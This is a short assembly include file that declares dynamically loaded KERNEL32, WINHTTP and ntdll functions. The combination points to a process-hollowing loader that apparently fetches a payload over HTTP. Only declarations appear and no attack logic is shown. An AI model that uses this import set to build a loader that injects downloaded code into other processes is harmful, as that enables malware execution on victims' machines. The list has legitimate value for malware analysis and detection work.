createFunc  KERNEL32, ExitProcess
createFunc  KERNEL32, GetSystemWindowsDirectoryW
createFunc  KERNEL32, CreateProcessW
createFunc  KERNEL32, TerminateProcess
createFunc  KERNEL32, GetSystemWow64DirectoryW

HMOD KERNEL32, <KERNEL32.dll>

createFunc  WINHTTP, WinHttpOpen
createFunc  WINHTTP, WinHttpSendRequest
createFunc  WINHTTP, WinHttpReceiveResponse
createFunc  WINHTTP, WinHttpQueryHeaders
createFunc  WINHTTP, WinHttpReadData
createFunc  WINHTTP, WinHttpConnect
createFunc  WINHTTP, WinHttpOpenRequest
createFunc  WINHTTP, WinHttpCloseHandle

HMOD WINHTTP, <WINHTTP.dll>

createFunc  ntdllp, ZwUnmapViewOfSection
createFunc  ntdllp, RtlInitUnicodeString
createFunc  ntdllp, LdrLoadDll
createFunc  ntdllp, LdrGetProcedureAddress
createFunc  ntdllp, NtClose
createFunc  ntdllp, NtQueryDirectoryFile
createFunc  ntdllp, NtCreateSection
createFunc  ntdllp, RtlAllocateHeap
createFunc  ntdllp, RtlFreeHeap
createFunc  ntdllp, memcpy
createFunc  ntdllp, ZwResumeThread
createFunc  ntdllp, ZwWriteVirtualMemory
createFunc  ntdllp, NtQueryInformationProcess
createFunc  ntdllp, ZwMapViewOfSection
createFunc  ntdllp, ZwSetContextThread
createFunc  ntdllp, ZwGetContextThread
createFunc  ntdllp, ZwSetInformationThread
createFunc  ntdllp, ZwQueryInformationThread
createFunc  ntdllp, ZwProtectVirtualMemory
createFunc  ntdllp, LdrProcessRelocationBlock
createFunc  ntdllp, RtlImageDirectoryEntryToData
createFunc  ntdllp, RtlImageNtHeader
createFunc  ntdllp, RtlImageNtHeaderEx
createFunc  ntdllp, NtOpenFile
createFunc  ntdllp, wcstoul
createFunc  ntdllp, memset

HMOD ntdllp, <>

